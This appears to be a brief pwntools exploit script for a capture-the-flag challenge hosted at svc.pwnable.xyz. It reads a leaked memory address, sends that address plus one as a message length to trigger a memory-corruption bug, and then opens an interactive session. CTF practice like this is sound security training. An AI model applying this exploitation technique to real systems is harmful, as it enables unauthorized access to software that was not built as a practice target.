from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30000)

r.recvuntil('Leak: 0x')
mapped = int(r.recvline()[:-1], 16)

r.sendlineafter('Length of your message: ', str(mapped + 1))
r.sendlineafter('Enter your message: ', '')

r.interactive()